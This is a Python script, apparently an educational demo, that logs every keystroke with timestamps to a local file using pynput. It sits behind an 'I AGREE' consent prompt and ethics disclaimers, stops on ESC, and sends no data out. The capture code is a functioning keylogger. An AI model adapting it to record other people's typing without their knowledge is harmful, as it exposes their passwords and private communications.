# ============================================================
# ETHICAL USE ONLY – EDUCATIONAL PORTFOLIO DEMONSTRATION
# ============================================================
# This script logs keystrokes to a local file (keylog.txt).
# It is designed to run ONLY on your own personal computer.
# Unauthorized use on any device you do not own is ILLEGAL.
# By running this script, you confirm you understand and agree.
# ============================================================

import pynput.keyboard as keyboard
import datetime
import sys

LOG_FILE = "keylog.txt"

def format_key(key):
    """Convert pynput key objects to readable text."""
    try:
        # Regular character (letter, number, symbol)
        if hasattr(key, 'char') and key.char is not None:
            return f"'{key.char}'"
        else:
            # Special keys – make them human-readable
            special = str(key).replace('Key.', '')
            if special == 'space':
                return '[SPACE]'
            elif special == 'enter':
                return '[ENTER]\n'   # newline makes log easier to read (each ENTER on its own line)
            elif special == 'backspace':
                return '[BACKSPACE]'
            elif special == 'tab':
                return '[TAB]'
            else:
                return f'[{special.upper()}]'
    except Exception:
        # Fallback for exotic keys (media keys, function keys) – prevents crash
        return str(key)

def on_press(key):
    # ETHICS: This function only runs after explicit user consent (see confirmation below)
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    key_str = format_key(key)
    entry = f"{timestamp}: {key_str}"
    
    # Write directly to file (simplest approach, no buffering) – good for learning, but writes every keystroke
    with open(LOG_FILE, "a", encoding="utf-8") as f:   # 'a' appends, utf-8 handles any Unicode character
        f.write(entry + "\n")

def on_release(key):
    # Stop when ESC is pressed – intentional kill switch for the lab
    if key == keyboard.Key.esc:
        print("\nESC pressed – stopping...")
        return False  # returning False tells pynput's Listener to stop
    return True

# ========== ETHICAL DISCLAIMER + USER CONFIRMATION ==========
print("\n" + "="*60)
print("EDUCATIONAL USE ONLY – KEYSTROKE CAPTURE DEMO")
print("="*60)
print("This tool will log EVERY KEY you press into a local file.")
print("It is intended ONLY for your own personal computer.")
print("Using this on ANY device without explicit permission is ILLEGAL.")
print("="*60)
print(f"Logs will be saved to: {LOG_FILE}")
print("Press ESC at any time to stop logging.\n")

# Force explicit user consent
confirm = input('To proceed, type "I AGREE" (case‑sensitive) and press Enter: ')
if confirm.strip() != "I AGREE":
    print("\nUser did not confirm. Aborting – no keystrokes will be logged.")
    sys.exit(0)

print("\nConsent confirmed. Starting logger – type anything, press ESC when done.\n")

# ========== START LISTENER ==========
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()      # non‑blocking start – allows script to continue
listener.join()       # blocks until listener stops (when ESC is pressed)

print(f"\nStopped! Keystrokes saved to {LOG_FILE}")
print("Remember: delete this file if you no longer need it.")
